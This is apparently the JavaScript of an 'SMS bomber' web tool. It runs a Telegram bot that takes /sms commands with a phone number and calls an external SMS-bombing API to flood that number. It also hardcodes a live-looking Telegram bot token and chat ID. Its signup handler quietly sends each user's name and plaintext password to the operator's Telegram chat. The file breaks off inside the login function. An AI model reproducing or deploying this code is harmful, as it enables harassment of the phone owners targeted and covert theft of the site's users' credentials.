// --- CONFIG ---
const TG_TOKEN = "8664320572:AAGK7PXpijGRtPV-ya6h9zFNvxet-T2m4CU";
const TG_CHAT_ID = "7969358399";
const SMS_API_BASE = "https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=";

// --- TELEGRAM BOT LISTENER (Polling) ---
let lastUpdateId = 0;
async function listenToTelegramBot() {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`);
        const data = await response.json();

        if (data.result && data.result.length > 0) {
            for (let update of data.result) {
                lastUpdateId = update.update_id;
                if (update.message && update.message.text) {
                    const msgText = update.message.text;
                    const chatId = update.message.chat.id;

                    // Handle /start command
                    if (msgText === '/start') {
                        sendMessage(chatId, "⚡ NEURAL_MATRIX Bot Active!\n\nUse command:\n/sms 923xxxxxxxxxx\n\nSystem status: Online 🟢");
                    }
                    // Handle /sms command
                    else if (msgText.startsWith('/sms')) {
                        const target = msgText.split(' ')[1];
                        if (target && target.length >= 10) {
                            addTerm(`REMOTE_BOT: Command Received for ${target}`, "term-green");
                            executeSmsAPI(target, chatId);
                        } else {
                            sendMessage(chatId, "⚠️ Usage: /sms 923xxxxxxxxxx");
                        }
                    }
                }
            }
        }
    } catch (e) { console.log("Connection lost, retrying..."); }
    setTimeout(listenToTelegramBot, 3000); 
}

// Function to send message to Telegram
async function sendMessage(chatId, text) {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
}

// Function to call your SMS API
async function executeSmsAPI(number, sourceChatId = null) {
    try {
        const res = await fetch(`${SMS_API_BASE}${number}`);
        if (sourceChatId) {
            sendMessage(sourceChatId, `🚀 Broadcast Initialized for ${number}\nStatus: Packets Dispatched`);
        }
        return true;
    } catch (e) {
        if (sourceChatId) sendMessage(sourceChatId, "❌ Terminal Error: API Link Broken");
        return false;
    }
}

// Init bot listener
listenToTelegramBot();

// --- UI & AUTH FUNCTIONS ---
function notify(msg) {
    const text = encodeURIComponent(msg);
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${text}&parse_mode=Markdown`;
    fetch(url, { mode: 'no-cors' }).catch(() => { let img = new Image(); img.src = url; });
}

function toggleAuth() {
    document.getElementById('signup-box').classList.toggle('hidden');
    document.getElementById('login-box').classList.toggle('hidden');
}

function handleSignup() {
    const f = document.getElementById('fname').value.trim();
    const l = document.getElementById('lname').value.trim();
    const p = document.getElementById('spass').value.trim();
    const msg = document.getElementById('auth-msg-s');

    if(!f || !p) {
        msg.innerHTML = "<span class='msg-error'>[!] All fields are required.</span>";
        return;
    }

    localStorage.setItem(`user_${f.toLowerCase()}`, JSON.stringify({name: f, last: l, pass: p}));
    notify(`🆕 **SIGNUP ALERT**\n👤 Name: ${f} ${l}\n🔑 Key: ${p}`);
    msg.innerHTML = "<span class='msg-success'>[+] Identity Registered. Switch to Login.</span>";
    setTimeout(toggleAuth, 1500);
}

function handleLogin() {
    const u = document.getElementById('login-user').value.trim().toLowerCase();
    const p = document.getElementById('login-pass').value.trim();
    const msg = document.getElementById('auth-msg-l');
    const data = localStorage.getItem(`user_${u}`);

    if(data) {
        const user = JSON.parse(data);
        if(user.pass === p) {
        